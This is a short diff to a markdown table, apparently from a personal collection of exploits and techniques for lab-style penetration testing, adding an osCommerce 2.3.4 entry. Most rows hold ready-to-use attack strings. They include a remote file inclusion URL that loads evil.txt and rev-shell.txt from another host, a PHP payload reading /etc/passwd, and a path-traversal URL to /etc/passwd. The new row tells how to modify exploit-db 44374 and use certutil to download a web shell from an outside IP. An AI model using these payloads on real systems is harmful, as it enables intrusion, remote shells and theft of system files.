@@ -114,6 +114,7 @@ Here I am collectign some of the random exploits and their exploitation technqiu
 |10.| ACS(Advanced Comment System) | LFI/RFI | Scenario | Working Exploits | Reverse Shell | https://192.168.130.5/internal/advanced_comment_system/index.php?ACS_path=http://192.168.30.120/evil.txt%00 content of Content of evil.txt <?php print system("cat /etc/passwd");?> RFI http://10.1.1.8//internal/advanced_comment_system/admin.php?ACS_path=http://10.21.0.40/rev-shell.txt%00|
 |11| HP Power Manager | Buffer Overflow | HP Power manager is running |[hpm_exploit.py] (https://github.com/Muhammd/HP-Power-Manager/blob/master/hpm_exploit.py) | Reverse Shell | Writeup and Reference |
 |12.| php mailer and cs cart |LFI (http://10.2.1.24/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../etc/passwd%00) | Scenario | Working Exploits | Reverse Shell | http://www.blackhat.com/presentations/bh-europe-09/Guimaraes/Blackhat-europe-09-Damele-SQLInjection-slides.pdf |
+|13.| oscommerce-2.3.4 | File Upload and Remote Code Execution | hosted in port 8080  | Working Exploits https://www.exploit-db.com/exploits/44374 | Reverse Shell | php system() command has been disabled. So you need to change the exploit by changing the system to shell_exec or simply exec. To upload the shell use echo shell_exec("cmd.exe /C certutil -urlcache -split -f http://10.13.19.104/shell.php shell.php) command in the exploit 44374.|
 
 
 
